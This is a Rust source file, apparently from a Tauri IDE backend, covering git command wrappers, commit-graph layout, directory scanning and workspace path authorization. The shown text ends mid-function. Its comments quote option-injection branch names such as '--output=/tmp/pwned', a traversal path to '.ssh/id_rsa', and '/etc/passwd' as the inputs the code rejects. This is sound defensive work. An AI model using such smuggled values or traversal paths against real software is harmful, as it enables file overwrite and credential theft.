use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::collections::HashSet;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::time::Duration;
use tauri::{Emitter, Manager};

/// 只读 git 命令的默认超时。
///
/// 同步命令跑在 wry 的 ipc:// custom-protocol worker 线程上，一个卡住的
/// `git`（等凭据、等网络、等大仓库 diff）会把同一 worker 上排队的后续命令
/// 全部拖住 —— 表现为整个 IDE 无响应。设上限让故障降级为「一条错误提示」。
/// status/log/diff/branch 这类只读命令没有副作用，杀掉不残留状态。
pub const GIT_CMD_TIMEOUT: Duration = Duration::from_secs(15);

/// 会写 index / 工作区的本地 git 命令（commit/add/checkout/reset/rebase/merge/
/// cherry-pick/stash/apply …）的超时。
///
/// 这类命令的耗时与仓库规模、检出文件量、钩子（husky/lefthook 跑 prettier/tsc/
/// 测试）正相关，15 秒远远不够；而超时用的是 SIGKILL：一个正在写 index 的 git
/// 被杀掉会留下 `.git/index.lock`，之后所有 add/commit/checkout 都报
/// "Unable to create index.lock"，用户得手工删锁，checkout/rebase 还可能停在
/// 中断态。给足时间，让「慢」和「真卡死」区分开。
pub const GIT_LOCAL_TIMEOUT: Duration = Duration::from_secs(300);

/// 构造一个 git 子进程命令，统一关掉凭据终端提示。
///
/// `GIT_TERMINAL_PROMPT=0` 让 git 在需要凭据时直接失败而不是弹出终端读密码：
/// 弹出的终端不属于 IDE 进程，用户看到的是一个无人看管的阻塞窗口。
/// 相关变量一并清零，避免用户 shell 里的 GIT_ASKPASS/SSH_ASKPASS 继承进来。
pub fn git_cmd() -> Command {
    let mut cmd = Command::new("git");
    cmd.env("GIT_TERMINAL_PROMPT", "0");
    cmd.env("GIT_ASKPASS", "");
    cmd.env("SSH_ASKPASS", "");
    cmd.env("GCM_INTERACTIVE", "never");
    cmd
}

/// 带超时地执行 git 命令。
///
/// `Command::output()` 没有超时：一个等凭据的 `git fetch` 会把这个命令
/// 所在的 IPC worker 线程永久占住，之后排队的命令一起假死。
/// 所有 git 调用都应走这里。
///
/// 取 `&mut Command`：`Command::arg` 等方法返回 `&mut Command`，
/// 命令链的终态就是这个类型。
fn git_output(cmd: &mut Command) -> Result<std::process::Output, String> {
    authorize_git_command(cmd, false)?;
    cmd.stdout(Stdio::piped()).stderr(Stdio::piped());
    run_with_timeout_spawn(cmd, GIT_CMD_TIMEOUT)
}

/// 会写 index / 工作区的 git 命令出口：超时放宽到 `GIT_LOCAL_TIMEOUT`。
/// 与 `git_output` 只差超时值，语义与管道处理完全一致。
fn git_output_local(cmd: &mut Command) -> Result<std::process::Output, String> {
    authorize_git_command(cmd, true)?;
    cmd.stdout(Stdio::piped()).stderr(Stdio::piped());
    run_with_timeout_spawn(cmd, GIT_LOCAL_TIMEOUT)
}

/// 拒绝形似选项的位置参数（首个非空白字符是 `-`）。
///
/// git 允许分支 / 标签名以 `-` 开头（`git check-ref-format refs/heads/--output=/tmp/x`
/// 通过），于是一个克隆来的仓库就能让分支列表里出现 `--output=/tmp/pwned` 这样
/// 的名字：用户点一次「Show Diff with Working Tree」，`git diff` 就会把输出写到
/// 任意可写路径（可覆盖文件）。同形状的 `--exec=`（rebase）、`--strategy=`（merge）
/// 也在可达集合内。
///
/// 两道防线都要有：命令里加 `--end-of-options` 是治本（要求 git ≥2.24），
/// 入口校验兜住没加该选项或将来新增的调用点。
fn reject_option_like(arg: &str) -> Result<(), String> {
    let trimmed = arg.trim();
    if trimmed.starts_with('-') {
        return Err(crate::error_proto::coded(
            "ref_invalid_leading_dash",
            trimmed,
        ));
    }
    Ok(())
}

/// 拒绝 refspec（含 `:`）的**引用名**参数。
///
/// `git push origin HEAD:refs/heads/x` 这种完整 refspec 能把本地任意提交
/// 推到任意 ref —— IDE 的「Push」只需要「把当前分支推到它的同名远端分支」
/// 这一种语义，因此 `:` 一律拒绝。同理适用于 `src:dst` 的任何变体。
///
/// 注意 `git checkout` / `git branch` 一类命令**允许** `a...b` 与 `HEAD^`
/// 之类的 revision 表达式，所以只拦 `:`，不把整段当纯 ref 名校验 —— 那会
/// 误伤合法用法。
fn reject_refspec_like(arg: &str) -> Result<(), String> {
    if arg.contains(':') {
        return Err(format!(
            "只支持推送到同名远端分支，不接受 refspec（含 ':'）: {}",
            arg
        ));
    }
    if arg.contains('*') || arg.contains('?') || arg.contains('[') {
        // 通配 refspec（`refs/heads/*`）同样超出「当前分支」语义，且让
        // 一次push影响的范围变得不可预期。
        return Err(crate::error_proto::coded("ref_unsupported", arg));
    }
    Ok(())
}

#[derive(Serialize, Deserialize, Debug, Clone)]
#[serde(rename_all = "camelCase")]
pub struct FileNode {
    pub name: String,
    pub path: String,
    pub is_directory: bool,
    pub children: Option<Vec<FileNode>>,
    pub git_status: Option<String>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
#[serde(rename_all = "camelCase")]
pub struct GitCommitDto {
    pub hash: String,
    pub short_hash: String,
    /// 父提交完整哈希（合并提交多于一个）
    pub parents: Vec<String>,
    pub message: String,
    pub author: String,
    pub author_email: String,
    pub date: String,
    pub branch_tags: Option<Vec<BranchTagDto>>,
    /// 本提交节点所在轨道
    pub graph_track: u32,
    /// 上一行边界汇入本节点的连线（源轨道 -> 节点）
    pub graph_ins: Vec<u32>,
    /// 本行中径直穿过的轨道
    pub graph_straight: Vec<u32>,
    /// 本节点出发到下一行边界的连线
    pub graph_outs: Vec<GraphEdgeDto>,
    pub is_merge: Option<bool>,
    /// 是否为当前 HEAD 的祖先（含 HEAD 自身）。仅 git_log 填充；
    /// false = 提交不在当前历史（HEAD 停在历史版本时其后的提交/旁支提交），
    /// 面板据此把行背景置灰，对齐 PyCharm。
    pub in_head: Option<bool>,
}

#[derive(Serialize, Deserialize, Debug, Clone, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub struct GraphEdgeDto {
    pub from: u32,
    pub to: u32,
}

/// 一行提交的图形布局
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct GraphRow {
    pub node: u32,
    pub ins: Vec<u32>,
    pub straight: Vec<u32>,
    pub outs: Vec<GraphEdgeDto>,
}

/// 按 git log 顺序（新→旧）为提交列表计算 DAG 轨道布局。
/// hashes[i] 的父提交为 parents_list[i]；父提交不在列表内（日志被截断）时，
/// 对应轨道保持期待状态，连线一直延伸到列表底部。
///
/// 返回 (rows, 末态轨道)：第二个值是布局算完后各轨道正在期待的提交哈希，
/// 也是分页续页时要喂回去的种子（见 `assign_graph_lanes_seeded`）。
pub fn assign_graph_lanes(
    hashes: &[String],
    parents_list: &[Vec<String>],
) -> (Vec<GraphRow>, Vec<Option<String>>) {
    assign_graph_lanes_seeded(hashes, parents_list, &[])
}

/// `assign_graph_lanes` 的种子版本：`seed[i]` 是第 i 条轨道进入本列表时
/// 已经期待的提交哈希。分页拉取必须带上种子 —— `git log --skip N` 给出的
/// 是一段没有上文的历史，每条轨道都从空槽开始时，上一页里本该笔直穿到
/// 页底的线会在新页第一行整体断裂（用户看就是主干图从中间断开）。
pub fn assign_graph_lanes_seeded(
    hashes: &[String],
    parents_list: &[Vec<String>],
    seed: &[Option<String>],
) -> (Vec<GraphRow>, Vec<Option<String>>) {
    // 每条轨道记录它当前「期待」的下一个提交哈希；None 表示空槽
    let mut lanes: Vec<Option<String>> = seed.to_vec();
    let mut rows = Vec::with_capacity(hashes.len());

    for (i, hash) in hashes.iter().enumerate() {
        // 找到期待此提交的轨道；没有则新开一条（多根/新头部）
        let node = match lanes
            .iter()
            .position(|l| l.as_deref() == Some(hash.as_str()))
        {
            Some(idx) => idx,
            None => {
                lanes.push(None);
                lanes.len() - 1
            }
        };

        let mut ins = Vec::new();
        let mut straight = Vec::new();
        for (idx, lane) in lanes.iter().enumerate() {
            if idx == node {
                continue;
            }
            match lane.as_deref() {
                Some(h) if h == hash => ins.push(idx as u32),
                Some(_) => straight.push(idx as u32),
                None => {}
            }
        }

        // 下一行轨道：node 槽与所有汇入槽清空；第一父接管 node 槽，
        // 其余父合并到已期待该哈希的轨道，否则占用最前面的空槽（或追加新轨道）。
        // 原地复用 lanes，消除每行分配与深拷贝（10000 提交下省去数十万次 String 分配）。
        lanes[node] = None;
        for &src in &ins {
            lanes[src as usize] = None;
        }

        let mut outs = Vec::new();
        for (p_idx, parent) in parents_list[i].iter().enumerate() {
            if p_idx == 0 {
                lanes[node] = Some(parent.clone());
                outs.push(GraphEdgeDto {
                    from: node as u32,
                    to: node as u32,
                });
            } else if let Some(to) = lanes
                .iter()
                .position(|l| l.as_deref() == Some(parent.as_str()))
            {
                outs.push(GraphEdgeDto {
                    from: node as u32,
                    to: to as u32,
                });
            } else {
                let to = match lanes.iter().position(|l| l.is_none()) {
                    Some(idx) => {
                        lanes[idx] = Some(parent.clone());
                        idx
                    }
                    None => {
                        lanes.push(Some(parent.clone()));
                        lanes.len() - 1
                    }
                };
                outs.push(GraphEdgeDto {
                    from: node as u32,
                    to: to as u32,
                });
            }
        }

        rows.push(GraphRow {
            node: node as u32,
            ins,
            straight,
            outs,
        });
    }

    (rows, lanes)
}

#[derive(Serialize, Deserialize, Debug, Clone)]
#[serde(rename_all = "camelCase")]
pub struct BranchTagDto {
    pub name: String,
    #[serde(rename = "type")]
    pub tag_type: String,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
#[serde(rename_all = "camelCase")]
pub struct GitBranchDto {
    pub name: String,
    pub is_current: bool,
    pub is_remote: bool,
    pub tracking: Option<String>,
    pub ahead: Option<u32>,
    pub behind: Option<u32>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
#[serde(rename_all = "camelCase")]
pub struct GitTagDto {
    pub name: String,
    pub short_hash: String,
    pub date: String,
    pub message: String,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
#[serde(rename_all = "camelCase")]
pub struct GitSubmoduleDto {
    pub path: String,
    pub url: String,
    pub branch: String,
    /// `git submodule status` 首字符：' ' 已初始化，'-' 未初始化，'+' 与记录不同，'U' 冲突
    pub status: String,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
#[serde(rename_all = "camelCase")]
pub struct GitWorktreeDto {
    pub path: String,
    pub head: String,
    pub branch: String,
    pub detached: bool,
    pub bare: bool,
    pub locked: bool,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
#[serde(rename_all = "camelCase")]
pub struct GitLfsStatusDto {
    pub installed: bool,
    pub version: String,
    pub files: Vec<String>,
    pub error: String,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
#[serde(rename_all = "camelCase")]
pub struct GitCredentialStatusDto {
    pub helper: String,
    pub osx_keychain_available: bool,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
#[serde(rename_all = "camelCase")]
pub struct GitChangedFileDto {
    pub path: String,
    pub status: String,
    /// index 相对 HEAD 有变化（含已暂存的新增/删除/重命名）
    pub is_staged: bool,
    /// 工作区相对 index 有变化（含未跟踪、冲突）；同一文件可以同时为 true
    pub is_unstaged: bool,
    pub additions: u32,
    pub deletions: u32,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
#[serde(rename_all = "camelCase")]
pub struct SearchResultDto {
    pub file_path: String,
    pub line_number: usize,
    pub line_content: String,
    pub match_start: usize,
    pub match_end: usize,
}

/// 还原 git 输出的路径：去掉 quotepath 引号并把 \NNN 八进制转义解码为 UTF-8
fn decode_git_path(raw: &str) -> String {
    let trimmed = raw.trim();
    if trimmed.len() >= 2 && trimmed.starts_with('"') && trimmed.ends_with('"') {
        let inner = &trimmed[1..trimmed.len() - 1];
        let mut bytes: Vec<u8> = Vec::with_capacity(inner.len());
        let mut chars = inner.chars();
        while let Some(c) = chars.next() {
            if c == '\\' {
                let oct: String = chars.by_ref().take(3).collect();
                if oct.len() == 3 && oct.chars().all(|d| d.is_ascii_digit()) {
                    if let Ok(v) = u8::from_str_radix(&oct, 8) {
                        bytes.push(v);
                        continue;
                    }
                }
                bytes.push(b'\\');
                bytes.extend_from_slice(oct.as_bytes());
            } else {
                bytes.extend_from_slice(c.to_string().as_bytes());
            }
        }
        String::from_utf8_lossy(&bytes).into_owned()
    } else {
        trimmed.to_string()
    }
}

// 单文件超过该大小就不做全文搜索：构建产物（monaco/ts.worker）普遍 4-8 MB，
// 读进来既难命中业务关键词，又会把同量级的瞬时分配压在 blocking 线程上。
const MAX_SEARCH_FILE_BYTES: u64 = 4 * 1024 * 1024;

/// 读前 512 字节嗅探 NUL：出现即视为二进制跳过，省掉一次必然失败的
/// UTF-8 全量读盘。文本判错（前 512 字节无 NUL 但整体非法）由 read_to_string
/// 的 Err 兜底，行为与原来一致。
///
/// `pub(crate)`：file_range.rs 的分块读复用同一嗅探（两处名单不能漂移）。
pub(crate) fn is_binary_file(path: &Path) -> bool {
    use std::io::Read;
    let Ok(mut f) = fs::File::open(path) else {
        return true;
    };
    let mut buf = [0u8; 512];
    match f.read(&mut buf) {
        Ok(n) => n > 0 && buf[..n].contains(&0),
        Err(_) => true,
    }
}

/// 项目树扫描的忽略表（`read_directory` / `scan_node` 用）。
///
/// 只隐藏真正无展示价值的目录：`.git` 内部结构、依赖缓存、Python 字节码。
/// 不再按 `build`/`env`/`vendor` 这类常见源码目录名硬编码隐藏 —— 用户
/// 的项目可能真的叫这些名字；需要排除时由 `.gitignore`（搜索）与用户
/// 自己的目录组织决定，而不是 IDE 替用户猜。
fn is_ignored_entry(name: &str, is_dir: bool, custom_ignored: Option<&[String]>) -> bool {
    const DEFAULT_IGNORED: &[&str] = &[
        ".git",
        ".idea",
        ".DS_Store",
        "node_modules",
        ".venv",
        "__pycache__",
    ];

    let patterns: Vec<&str> = match custom_ignored {
        Some(list) if !list.is_empty() => list
            .iter()
            .map(|s| s.trim())
            .filter(|s| !s.is_empty())
            .collect(),
        _ => DEFAULT_IGNORED.to_vec(),
    };

    for pat in patterns {
        if let Some(suffix) = pat.strip_prefix('*') {
            if name.ends_with(suffix) {
                return true;
            }
        } else if let Some(prefix) = pat.strip_suffix('*') {
            if name.starts_with(prefix) {
                return true;
            }
        } else if pat.ends_with('/') {
            let dir_pat = pat.trim_end_matches('/');
            if is_dir && name == dir_pat {
                return true;
            }
        } else if name == pat {
            return true;
        }
    }

    false
}

/// 目录树递归的深度上限。
///
/// 前端「展开全部」传 16；这里再兜一道，保证任何调用方（含未来的新入口）
/// 都不能把递归推到深不可测 —— 软链成环时深度是唯一的刹车，Windows 的
/// 32767 路径上限下递归数万层会直接栈溢出，而 release 是 panic=abort，
/// 整个 IDE 进程（连同未保存缓冲）会被杀掉。
const MAX_SCAN_DEPTH: u32 = 64;

/// 单次 read_directory 返回的节点总预算：防止超大目录/展开全部把
/// DTO 和 IPC 载荷推到内存不可控。超过时返回明确错误，而不是静默截断。
const MAX_SCAN_NODES: usize = 50_000;
/// git status 条目上限（含 ignored=matching 的噪声）。
const MAX_STATUS_FILES: usize = 20_000;

/// 读系统剪贴板里的**文件绝对路径**（Finder Cmd+C 复制的文件/文件夹）。
///
/// 终端的 Cmd+V 走浏览器 `clipboardData`，`File` 对象只有 name/type/size、
/// 拿不到绝对路径（见 `clipboard` 模块文档），所以粘贴路径必须由这里提供。
/// 剪贴板没有文件时返回空数组 —— 普通文本粘贴是常态，不是错误。
#[tauri::command]
pub async fn clipboard_file_paths() -> Result<Vec<String>, String> {
    let paths = crate::clipboard::clipboard_file_paths()
        .into_iter()
        .map(|p| p.to_string_lossy().into_owned())
        .collect();
    Ok(paths)
}

#[tauri::command]
pub async fn read_directory(
    path: String,
    max_depth: Option<u32>,
    ignored: Option<Vec<String>>,
    registry: tauri::State<'_, WorkspaceRegistry>,
) -> Result<FileNode, String> {
    read_directory_impl(&path, max_depth, ignored.as_deref(), &registry).await
}

/// `read_directory` 的无状态实现（`State` 无法在测试里构造，见 fs_commands_tests）。
async fn read_directory_impl(
    path: &str,
    max_depth: Option<u32>,
    ignored: Option<&[String]>,
    registry: &WorkspaceRegistry,
) -> Result<FileNode, String> {
    let authorized = authorize_workspace_path(registry, path, false)?;
    let depth = max_depth.unwrap_or(2).min(MAX_SCAN_DEPTH);
    let path = path.to_string();
    let ignored_owned = ignored.map(|s| s.to_vec());
    tauri::async_runtime::spawn_blocking(move || {
        if !authorized.exists() {
            return Err(format!("Path does not exist: {}", path));
        }
        let mut budget = 0usize;
        scan_node(&authorized, depth, ignored_owned.as_deref(), &mut budget)
    })
    .await
    .map_err(|e| format!("读取目录失败: {e}"))?
}

fn scan_node(
    path: &Path,
    remaining_depth: u32,
    ignored: Option<&[String]>,
    budget: &mut usize,
) -> Result<FileNode, String> {
    *budget += 1;
    if *budget > MAX_SCAN_NODES {
        return Err(crate::error_proto::coded(
            "tree_too_large",
            MAX_SCAN_NODES.to_string(),
        ));
    }
    let name = path
        .file_name()
        .map(|s| s.to_string_lossy().to_string())
        .unwrap_or_else(|| path.to_string_lossy().to_string());
    let is_dir = path.is_dir();

    if !is_dir || remaining_depth == 0 {
        return Ok(FileNode {
            name,
            path: path.to_string_lossy().to_string(),
            is_directory: is_dir,
            children: None,
            git_status: None,
        });
    }

    let mut children = Vec::new();
    if let Ok(entries) = fs::read_dir(path) {
        for entry in entries.flatten() {
            let entry_path = entry.path();
            let entry_name = entry.file_name().to_string_lossy().to_string();
            // 用 entry.file_type()（**不跟随**软链）决定是否继续下探：
            // 软链目录一旦被跟随，一个 `latest -> ..` 就能把「展开全部」的
            // 16 层深度花在工作区之外，成环还会把递归推到栈溢出。
            // 软链本身仍作为叶子节点展示（对齐修复前文件软链的表现）。
            let descend = entry.file_type().map(|t| t.is_dir()).unwrap_or(false);
            // 忽略判定在类型之后：同名文件与目录语义不同（见 is_ignored_entry）。
            if is_ignored_entry(&entry_name, descend, ignored) {
                continue;
            }
            if descend {
                match scan_node(&entry_path, remaining_depth - 1, ignored, budget) {
                    Ok(child_node) => children.push(child_node),
                    Err(e) if e.starts_with("ERR:tree_too_large|") => return Err(e),
                    Err(_) => {}
                }
            } else {
                // 文件、软链（含指向目录的软链）、以及其它特殊文件：一律作叶子节点，
                // 不再下探。is_directory 恒为 false —— 指向目录的软链若标成目录，
                // 前端会再发一次 read_directory，而那次授权会把软链解析到工作区外
                // 并报错，用户看到的是一棵点不开的树。
                children.push(FileNode {
                    name: entry_name,
                    path: entry_path.to_string_lossy().to_string(),
                    is_directory: false,
                    children: None,
                    git_status: None,
                });
            }
        }
    }

    children.sort_by(|a, b| {
        if a.is_directory == b.is_directory {
            a.name.cmp(&b.name)
        } else if a.is_directory {
            std::cmp::Ordering::Less
        } else {
            std::cmp::Ordering::Greater
        }
    });

    Ok(FileNode {
        name,
        path: path.to_string_lossy().to_string(),
        is_directory: true,
        children: Some(children),
        git_status: None,
    })
}

/// 已授权的工作区根目录集合。
///
/// 前端在打开/切换项目时通过 `register_workspace` 登记。所有会触碰用户文件的
/// 命令（读 / 写 / 删 / 粘贴）都要求目标路径落在某个已登记根之内。
///
/// 为什么必须做：这些命令的 `path` 参数完全由前端给定，而后端此前零校验。
/// 本应用会渲染仓库内容 —— 一个精心构造的 Markdown 文件就能经
/// `resolveMarkdownPath` 拼出 `../../../../.ssh/id_rsa` 这样的路径，
/// 于是「打开项目」等价于「授予任意文件读写」。工作区白名单把爆炸半径
/// 收回到用户主动打开的目录。
///
/// 注意与 `ensure_safe_git_path` 的分工：那个管 git 破坏性操作的仓库相对
/// 路径，这个管裸文件系统命令的绝对路径，两者都需要。
///
/// 值是「只读根」标记：以只读方式打开的目录只放行读命令（见
/// `authorize_workspace_path` 的 `need_write`）。
#[derive(Default, Clone)]
pub struct WorkspaceRegistry(
    std::sync::Arc<std::sync::Mutex<std::collections::HashMap<PathBuf, bool>>>,
);

static WORKSPACE_ENFORCED: std::sync::atomic::AtomicBool =
    std::sync::atomic::AtomicBool::new(false);

impl WorkspaceRegistry {
    /// 生产启动后置位：空 registry 必须 fail-closed。测试/极早启动阶段保持
    /// false，避免每个单元测试都要先伪造一个工作区。
    pub fn set_enforced(&self) {
        WORKSPACE_ENFORCED.store(true, std::sync::atomic::Ordering::SeqCst);
    }

    fn enforced() -> bool {
        WORKSPACE_ENFORCED.load(std::sync::atomic::Ordering::SeqCst)
    }

    /// 进程级镜像：Git 命令没有 `State` 参数，统一在 `git_output*` 出口
    /// 用这份注册表复核 `-C <repo>`。测试创建独立 registry，不写全局，
    /// 因此不会把临时仓库误判成越界。生产由 `register_workspace` 命令同步。
    pub fn global() -> &'static WorkspaceRegistry {
        static GLOBAL: std::sync::OnceLock<WorkspaceRegistry> = std::sync::OnceLock::new();
        GLOBAL.get_or_init(WorkspaceRegistry::default)
    }

    fn insert_global(&self, path: PathBuf, read_only: bool) {
        if let Ok(mut roots) = self.0.lock() {
            roots.insert(path, read_only);
        }
    }

    fn remove_global(&self, path: &Path) {
        if let Ok(mut roots) = self.0.lock() {
            roots.remove(path);
        }
    }

    fn snapshot(&self) -> Vec<(PathBuf, bool)> {
        self.0
            .lock()
            .map(|r| r.iter().map(|(p, ro)| (p.clone(), *ro)).collect())
            .unwrap_or_default()
    }
}

/// Git 命令的仓库根授权：仓库根等于工作区，或仓库根在工作区内。
///
/// 打开仓库子目录时，前端传入的 `-C` 仍是该子目录，因此不需要「祖先仓库」
/// 特例；旧实现允许 `root.starts_with(canonical)`，等于把工作区的任意祖先
/// （例如 `$HOME` 的 dotfiles 仓库）也授了权。全局为空时：生产启动后由
/// `set_enforced` 置为 fail-closed，测试保持放行。
fn authorize_git_repo(repo: &str, need_write: bool) -> Result<(), String> {
    let registry = WorkspaceRegistry::global();
    let roots = registry.snapshot();
    if roots.is_empty() {
        return if WorkspaceRegistry::enforced() {
            Err(crate::error_proto::coded("workspace_missing", repo))
        } else {
            Ok(())
        };
    }
    let canonical = fs::canonicalize(repo).unwrap_or_else(|_| PathBuf::from(repo));
    let mut read_only_hit = false;
    for (root, read_only) in roots {
        // Only the repository root itself or a repo nested inside the opened
        // workspace is legitimate. The old `root.starts_with(canonical)` also
        // authorized any ancestor (e.g. $HOME for a dotfiles repo).
        if canonical.starts_with(&root) {
            if !need_write || !read_only {
                return Ok(());
            }
            read_only_hit = true;
        }
    }
    Err(crate::error_proto::coded(
        if read_only_hit {
            "workspace_read_only"
        } else {
            "path_outside_workspace"
        },
        repo,
    ))
}

/// 从 `git [-C dir] ...` 里取出 `-C` 的目录；没有则无需授权（config 等）。
fn git_command_dir(cmd: &Command) -> Option<String> {
    let mut args = cmd.get_args();
    while let Some(arg) = args.next() {
        if arg == "-C" {
            return args.next().map(|d| d.to_string_lossy().into_owned());
        }
    }
    None
}

fn authorize_git_command(cmd: &Command, need_write: bool) -> Result<(), String> {
    match git_command_dir(cmd) {
        Some(dir) => authorize_git_repo(&dir, need_write),
        None => Ok(()),
    }
}

/// 原生文件选择器授予的「一次性读路径」。
///
/// `fs_diff_files` 的语义是“和任意文件比较”，不能简单套工作区白名单；
/// 但也不能让 renderer 直接传 `/etc/passwd`。只有 `pick_path` 原生面板
/// 返回的路径才进这里，把授权收回到用户手势。
#[derive(Default)]
pub struct PathGrantRegistry(std::sync::Mutex<std::collections::HashSet<PathBuf>>);

impl PathGrantRegistry {
    pub fn grant(&self, path: &Path) {
        let canonical = fs::canonicalize(path).unwrap_or_else(|_| path.to_path_buf());
        if let Ok(mut set) = self.0.lock() {
            // 上限只是防无界增长；正常一次比较只登记一个路径。
            if set.len() >= 64 {
                set.clear();
            }
            set.insert(canonical);
        }
    }

    pub fn is_granted(&self, path: &Path) -> bool {
        let canonical = fs::canonicalize(path).unwrap_or_else(|_| path.to_path_buf());
        self.0
            .lock()
            .map(|set| set.contains(&canonical))
            .unwrap_or(false)
    }

    /// True when `path` is a grant itself or lives under a granted directory.
    /// Used for destinations that do not exist yet (new clone/worktree path):
    /// the native picker grants the chosen parent, then the caller appends a
    /// child name.
    pub fn is_contained(&self, path: &Path) -> bool {
        let canonical = fs::canonicalize(path).unwrap_or_else(|_| {
            let parent = path.parent().and_then(|p| fs::canonicalize(p).ok());
            match (parent, path.file_name()) {
                (Some(parent), Some(name)) => parent.join(name),
                _ => path.to_path_buf(),
            }
        });
        self.0
            .lock()
            .map(|set| {
                set.iter().any(|grant| {
                    canonical == *grant || (grant.is_dir() && canonical.starts_with(grant))
                })
            })
            .unwrap_or(false)
    }

    /// 关闭项目时清空全部临时读授权。比较目标通常在工作区之外，
    /// 按 root 前缀清理会留下这些授权；宁可让下次 Compare 重新选文件。
    pub fn clear(&self) {
        if let Ok(mut set) = self.0.lock() {
            set.clear();
        }
    }
}

/// 登记一个工作区根（打开 / 切换项目时调用）。
///
/// `read_only` 缺省 false（可读写）；同一个路径重复登记会覆盖标记，
/// 于是「以只读方式重新打开」能生效。
#[tauri::command]
pub fn register_workspace(
    registry: tauri::State<'_, WorkspaceRegistry>,
    path: String,
    read_only: Option<bool>,
) -> Result<(), String> {
    register_workspace_dir(&registry, &path, read_only.unwrap_or(false))?;
    if let Ok(canonical) = fs::canonicalize(&path) {
        WorkspaceRegistry::global().insert_global(canonical, read_only.unwrap_or(false));
    }
    Ok(())
}

/// `register_workspace` 的无状态实现：命令本体只是 State 包装，
/// 测试可直接调这里（State 无法在测试里构造）。
///
/// `pub(crate)`：file_range.rs / extensions.rs 的测试登记授权根时复用，
#[cfg(target_os = "macos")]
pub(crate) fn note_macos_recent_document(path: &std::path::Path) {
    use objc2::MainThreadMarker;
    use objc2_app_kit::NSDocumentController;
    use objc2_foundation::{NSString, NSURL};
    let path_str = path.to_string_lossy();
    let ns_path = NSString::from_str(&path_str);
    let url = NSURL::fileURLWithPath(&ns_path);
    if let Some(mtm) = MainThreadMarker::new() {
        let controller = NSDocumentController::sharedDocumentController(mtm);
        controller.noteNewRecentDocumentURL(&url);
    }
}

#[cfg(not(target_os = "macos"))]
pub(crate) fn note_macos_recent_document(_path: &std::path::Path) {}

pub(crate) fn register_workspace_dir(
    registry: &WorkspaceRegistry,
    path: &str,
    read_only: bool,
) -> Result<(), String> {
    let canonical = fs::canonicalize(path).map_err(|e| {
        crate::error_proto::coded_display("workspace_missing", format!("{path} ({e})"))
    })?;
    if !canonical.is_dir() && !canonical.is_file() {
        return Err(crate::error_proto::coded("not_a_directory", path));
    }
    note_macos_recent_document(&canonical);
    registry
        .0
        .lock()
        .map_err(|_| crate::error_proto::coded("workspace_registry_locked", ""))?
        .insert(canonical, read_only);
    Ok(())
}

/// 注销一个工作区根（关闭项目时调用）。注销后该目录下的文件立即使相关命令失效。
#[tauri::command]
pub fn unregister_workspace(
    registry: tauri::State<'_, WorkspaceRegistry>,
    grants: tauri::State<'_, PathGrantRegistry>,
    path: String,
) -> Result<(), String> {
    let canonical = fs::canonicalize(&path).unwrap_or_else(|_| PathBuf::from(&path));
    registry
        .0
        .lock()
        .map_err(|_| crate::error_proto::coded("workspace_registry_locked", ""))?
        .remove(&canonical);
    grants.clear();
    WorkspaceRegistry::global().remove_global(&canonical);
    Ok(())
}

/// 校验 `path` 落在某个已登记工作区内，返回其规范化形式。
///
/// canonicalize 同时解决符号链接逃逸（`/tmp` → `/private/tmp`、
/// 用户自建的指向外部的软链）与大小写敏感性差异。文件尚不存在时
/// （创建 / 写入新文件）canonicalize 会失败，此时退化为「规范化最近的
/// 存在祖先 + 拼接剩余段」的词法校验。
///
/// `need_write=true` 时命中只读根即报错：这是「外部目录以只读方式打开」的
/// 全部实现 —— 校验点集中在这里，写命令不必各自判断。
///
/// `pub(crate)`：file_range.rs / extensions.rs 的读命令复用同一授权点，
/// 不各自造白名单（见 WorkspaceRegistry 的注释）。
pub(crate) fn authorize_workspace_path(
    registry: &WorkspaceRegistry,
    path: &str,
    need_write: bool,
) -> Result<PathBuf, String> {
    let target = Path::new(path);
    if target.as_os_str().is_empty() {
        return Err("路径为空".to_string());
    }
    let roots = registry
        .0
        .lock()
        .map_err(|_| crate::error_proto::coded("workspace_registry_locked", ""))?;
    if roots.is_empty() {
        return Err("没有已授权的工作区：请先打开项目目录".to_string());
    }

    // 命中的根里取最长前缀：嵌套工作区时「最具体」的那个生效
    //（只读根里再开一个可写子目录、或反过来，都按子目录的登记为准）。
    let check = |candidate: &Path| -> Result<(), String> {
        let hit = roots
            .iter()
            .filter(|(root, _)| candidate.starts_with(root))
            .max_by_key(|(root, _)| root.as_os_str().len());
        match hit {
            None => Err(crate::error_proto::coded("path_outside_workspace", path)),
            Some((_, read_only)) => {
                if *read_only && need_write {
                    Err(crate::error_proto::coded("workspace_read_only", path))
                } else {
                    Ok(())
                }
            }
        }
    };

    // 已存在：直接规范化后比较
    if let Ok(canonical) = fs::canonicalize(target) {
        check(&canonical)?;
        return Ok(canonical);
    }

    // 不存在（待创建）：找最近的存在祖先规范化，再把剩余段拼回来比对。
    // 未解析路径里出现 `..` 时不能按「父目录 + 文件名」重建（file_name()
    // 对 `..` 返回 None，会静默丢掉该段，校验的路径与实际写入的不是同一条），
    // 直接拒绝；正常前端路径都是规范绝对路径。
    if target
        .components()
        .any(|c| matches!(c, std::path::Component::ParentDir))
    {
        return Err(crate::error_proto::coded("path_outside_workspace", path));
    }
    let mut ancestor = target.to_path_buf();
    let mut tail: Vec<std::ffi::OsString> = Vec::new();
    loop {
        match fs::canonicalize(&ancestor) {
            Ok(canonical) => {
                let mut rebuilt = canonical.clone();
                for seg in tail.iter().rev() {
                    rebuilt.push(seg);
                }
                // canonicalize 对「悬空软链」会失败，于是这里可能剩下带软链的
                // 尾段。若只做词法 starts_with，`workspace/escape` 指向区外
                // 不存在的文件时会被放行，随后的 write 会顺着链接在区外创建。
                // 逐段 lstat，发现软链或中间层非目录立即拒绝。
                let mut probe = canonical.clone();
                for seg in tail.iter().rev() {
                    probe.push(seg);
                    match fs::symlink_metadata(&probe) {
                        Ok(meta) if meta.file_type().is_symlink() => {
                            return Err(crate::error_proto::coded("path_outside_workspace", path))
                        }
